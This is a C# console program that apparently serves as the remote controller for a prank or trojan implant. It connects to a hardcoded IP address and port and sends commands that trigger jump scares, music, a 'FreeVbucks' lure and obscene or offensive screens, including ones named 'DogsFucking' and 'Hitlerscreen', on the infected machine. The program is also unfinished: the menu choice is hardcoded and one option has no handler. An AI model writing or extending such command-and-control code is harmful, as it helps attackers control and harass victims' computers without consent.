using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace JumpScareController
{
    internal class Program
    {
        static void Main(string[] args)
        {
            String Option = "1";
            String link = "";
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("JumpScare Controller made By DJHIPHOUSE");

            Console.ForegroundColor = ConsoleColor.DarkBlue;
            TcpClient client = new TcpClient();
            client.Connect(IPAddress.Parse("45.142.115.67"),8090);
            byte[] flies = Encoding.UTF8.GetBytes("flies\n");
            byte[] Jumpscare = Encoding.UTF8.GetBytes("JumpScare\n");
            byte[] Playmusic = Encoding.UTF8.GetBytes("PlayMusik " + link + "\n");
            byte[] FreeVbucks = Encoding.UTF8.GetBytes("FreeVbucks\n");
            byte[] DogsFuck = Encoding.UTF8.GetBytes("DogsFucking\n");
            byte[] CatGay = Encoding.UTF8.GetBytes("Catwalk\n");
            byte[] disable = Encoding.UTF8.GetBytes("disable\n");
          
            Console.WriteLine("\n\n[1] Flies\n[2] JumpScare\n[3] Play Music\n[4] FreeVBucks\n[5] DogsFucking\n[6] Hitlerscreen\n[7] Catwalk\n[8] Disable ALL\n\n\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            switch (Option)
            {


                case "1":
                    client.GetStream().Write(flies);
                    break;

                case "2":
                    client.GetStream().Write(Jumpscare);
                    break;

                case "3":
                    client.GetStream().Write(Playmusic);
                    break;

                case "4":
                    client.GetStream().Write(FreeVbucks);
                    break;
                case "5":
                    client.GetStream().Write(DogsFuck);
                    break;
                case "7":
                    client.GetStream().Write(CatGay);
                    break;
                case "8":
                    client.GetStream().Write(disable);
                    break;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Send Sucessfully!");
            client.Close();
        }
    }
}
